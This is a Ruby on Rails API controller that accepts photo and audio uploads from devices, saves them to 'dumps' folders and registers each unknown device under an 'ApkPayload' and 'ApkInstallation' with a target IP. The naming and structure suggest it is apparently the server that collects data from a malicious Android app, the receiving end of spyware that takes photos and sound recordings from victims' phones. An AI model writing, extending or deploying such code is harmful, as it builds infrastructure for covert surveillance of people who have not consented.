module Api
  class MediaController < Api::BaseController
    def upload_photo
      device_id = params[:device_id] || request.headers['X-Device-ID']
      return render json: { error: 'Missing device_id' }, status: :bad_request if device_id.blank?
      
      smartphone = find_or_create_smartphone(device_id)
      
      if params[:file].present?
        # Validate file extension
        ext = File.extname(params[:file].original_filename).downcase rescue '.jpg'
        allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
        ext = '.jpg' unless allowed_extensions.include?(ext)
        
        filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
        filepath = Rails.root.join('files', 'dumps', 'photos', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(params[:file].read) }
        
        smartphone.pictures.create!(
          filename: filename,
          date: Date.today
        )
      elsif params[:data].present? || params[:photo].present?
        # Base64 encoded image - Android sends as 'photo' key
        base64_data = params[:data] || params[:photo]
        filename = "photo_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.jpg"
        filepath = Rails.root.join('files', 'dumps', 'photos', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(Base64.decode64(base64_data)) }
        
        smartphone.pictures.create!(
          filename: filename,
          date: Date.today
        )
      else
        return render json: { error: 'No photo data provided' }, status: :bad_request
      end
      
      render json: { status: 'success', message: 'Photo saved' }, status: :ok
    rescue StandardError => e
      Rails.logger.error("Photo Upload Error: #{e.message}")
      render json: { error: e.message }, status: :unprocessable_entity
    end

    def upload_audio
      device_id = params[:device_id] || request.headers['X-Device-ID']
      return render json: { error: 'Missing device_id' }, status: :bad_request if device_id.blank?
      
      smartphone = find_or_create_smartphone(device_id)
      
      if params[:file].present?
        # Validate file extension
        ext = File.extname(params[:file].original_filename).downcase rescue '.mp3'
        allowed_extensions = ['.mp3', '.wav', '.ogg', '.m4a', '.aac', '.flac']
        ext = '.mp3' unless allowed_extensions.include?(ext)
        
        filename = "audio_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}#{ext}"
        filepath = Rails.root.join('files', 'dumps', 'audio', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(params[:file].read) }
        
        smartphone.recordings.create!(
          filename: filename,
          date: Date.today,
          duration: params[:duration] || 'unknown'
        )
      elsif params[:data].present? || params[:audio].present?
        # Base64 encoded audio - Android sends as 'audio' key
        base64_data = params[:data] || params[:audio]
        filename = "audio_#{sanitize_device_id(device_id)}_#{Time.now.to_i}_#{SecureRandom.uuid}.mp3"
        filepath = Rails.root.join('files', 'dumps', 'audio', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(Base64.decode64(base64_data)) }
        
        smartphone.recordings.create!(
          filename: filename,
          date: Date.today,
          duration: params[:duration] || 'unknown'
        )
      else
        return render json: { error: 'No audio data provided' }, status: :bad_request
      end
      
      render json: { status: 'success', message: 'Audio saved' }, status: :ok
    rescue StandardError => e
      Rails.logger.error("Audio Upload Error: #{e.message}")
      render json: { error: e.message }, status: :unprocessable_entity
    end
    
    private
    
    # Sanitize device_id to prevent path traversal
    def sanitize_device_id(device_id)
      device_id.to_s.gsub(/[^a-zA-Z0-9_\-]/, '')
    end
    
    def find_or_create_smartphone(device_id)
      smartphone = Smartphone.find_by(device_id: device_id)
      return smartphone if smartphone
      
      payload = ApkPayload.first_or_create!(name: 'default', destination_ip: '0.0.0.0', destination_port: '8080')
      installation = ApkInstallation.first_or_create!(apk_payload: payload, target_ip: device_id, status: 'active')
      Smartphone.create!(device_id: device_id, name: "Device #{device_id[0..7]}", apk_installation: installation)
    end
  end
end
